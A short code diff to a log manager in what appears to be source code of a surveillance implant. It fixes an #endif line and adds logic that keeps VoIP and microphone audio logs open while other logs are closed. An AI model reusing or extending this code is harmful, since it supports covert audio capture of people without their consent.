@@ -205,7 +205,7 @@ static RCSMLogManager *sharedLogManager = nil;
 #ifdef DEBUG_LOG_MANAGER      
       infoLog(@"rawHeader Size after Encryption: %d", [rawHeader length]);
       infoLog(@"headerLength: %x", headerLength);
-#endif DEBUG
+#endif
       
       
       [rawHeader release];
@@ -577,6 +577,21 @@ static RCSMLogManager *sharedLogManager = nil;
   
   for (item in mActiveQueue)
     {
+      int32_t agentID = [[item objectForKey: @"agentID"] intValue];
+
+      if (continueLogging == YES
+          && (agentID == AGENT_VOIP
+          ||  agentID == AGENT_MICROPHONE))
+        {
+          //
+          // Close all the logs except the Audio ones
+          //
+#ifdef DEBUG_LOG_MANAGER
+          warnLog(@"Skipping Audio Log");
+#endif
+          continue;
+        }
+    
       [[item objectForKey: @"handle"] closeFile];
       [newItems addObject: item];
       [discardedItem addIndex: index];
